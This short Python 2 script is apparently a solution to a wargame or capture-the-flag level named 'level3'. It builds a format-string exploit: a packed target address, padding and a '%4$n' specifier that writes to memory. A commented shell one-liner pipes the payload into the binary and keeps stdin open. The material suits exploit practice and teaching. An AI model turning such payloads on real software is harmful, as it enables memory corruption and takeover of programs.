#(python -c "print '\x08\x04\x98\x8c'[::-1] + 'q'*60 + '%4\$n'"; cat) | ./level3

import struct

mAddr = struct.pack("I", 0x804988c)

padding = mAddr+("a"*60)+"%4$n"

print padding
